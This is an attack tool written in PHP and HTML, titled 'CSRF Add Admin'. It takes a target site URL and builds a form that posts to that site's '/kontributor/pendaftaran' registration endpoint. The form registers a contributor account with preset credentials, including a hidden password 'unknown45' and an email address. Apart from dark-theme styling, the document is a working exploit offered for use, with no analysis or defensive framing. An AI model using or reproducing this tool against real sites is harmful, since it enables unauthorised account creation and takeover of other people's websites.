
<html>
<head>
<title>[+] CSRF Add Admin [+]</title>
<meta name="viewport" content="width=device-width, initial-scale=1" /> 
<script src="https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@latest/pace-theme-default.min.css">
</head>
<body bgcolor="#1e1e1e" text="white">
<style>
  @import url('https://fonts.googleapis.com/css?family=Staatliches');

textarea {
max-width: 90%;
width: 100%;
height: 150px;
resize: none;
outline: none;
overflow: auto;
background: transparent;
color: #ffffff;
}

button {
  background: transparent;
    font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

input {
  background: transparent;
  font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

font {
  font-family: Staatliches;
}

body::-webkit-scrollbar {
  width: 12px;               /* width of the entire scrollbar */
}

body::-webkit-scrollbar-track {
  background: #1e1e1e;        /* color of the tracking area */
}

body::-webkit-scrollbar-thumb {
  background-color: #1e1e1e;    /* color of the scroll thumb */
  border: 3px solid gray;  /* creates padding around scroll thumb */
}
</style>
<center>
<font face=courier new size=4>CSRF Add Admin<br><font size=3>Auto Add Kontributor<br>( gabut awokwow )<br><hr>
<form method="post">
<font face=courier new>URL:</font> <input type="text" class="area" name="url" size="30" height="20" placeholder="http://target.co.li/" style="margin: 5px auto; padding-left: 5px;" required><br>
<input type="submit" name="go" class ="asu" value="Lock Target">
</form>
<?php
$url = htmlspecialchars($_POST['url']);
$submit = $_POST['go'];
if($submit) {
    echo "<center><i>Target : </i><b>".$url;
    echo "</b><form action='$url/kontributor/pendaftaran' method=POST enctype='multipart/form-data' onSubmit='return validasireg(this)' target=_blank><br><i>Username : <input type=text class=form-control name=a placeholder=Nama value=asus size=35><br>Password : <input type=text class=form-control name=b placeholder=Username value=unknown45 size=35 disabled><input type=hidden class=form-control name=c value=unknown45 size=35><input type=hidden class=form-control name=d value=chopsuey@baybabes.com size=35><input type=hidden class=form-control name=e value=1231231231 size=35><br>Foto : <input type=file class=form-control name=f size=35><br><br><input type=submit name=submit id=submit value='Add Kontributor'></form>";
}
?>
<center><hr><font size=3>Unknown45 - 2021</font>

